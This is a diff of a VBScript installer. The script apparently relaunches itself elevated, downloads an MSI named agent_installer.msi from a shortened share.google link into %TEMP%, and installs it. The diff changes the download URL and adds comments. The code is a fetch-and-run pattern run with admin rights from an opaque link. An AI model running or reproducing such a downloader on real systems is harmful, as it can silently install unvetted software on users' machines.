@@ -10,7 +10,7 @@ If Not WScript.Arguments.Named.Exists("elevated") Then
 End If
 
 Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
-strUrl = "https://share.google/mkGe1JX56Lut4KMdt"
+strUrl = "https://share.google/5icY94HkmAiaVcn86"
 strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
 strFile = strTemp & "\agent_installer.msi"
 
@@ -22,10 +22,10 @@ objXMLHTTP.send()
 If objXMLHTTP.Status = 200 Then
     Set objADOStream = CreateObject("ADODB.Stream")
     objADOStream.Open
-    objADOStream.Type = 1
+    objADOStream.Type = 1 ' Binary
     objADOStream.Write objXMLHTTP.ResponseBody
     objADOStream.Position = 0
-    objADOStream.SaveToFile strFile, 2
+    objADOStream.SaveToFile strFile, 2 ' Overwrite
     objADOStream.Close
 
     ' Install
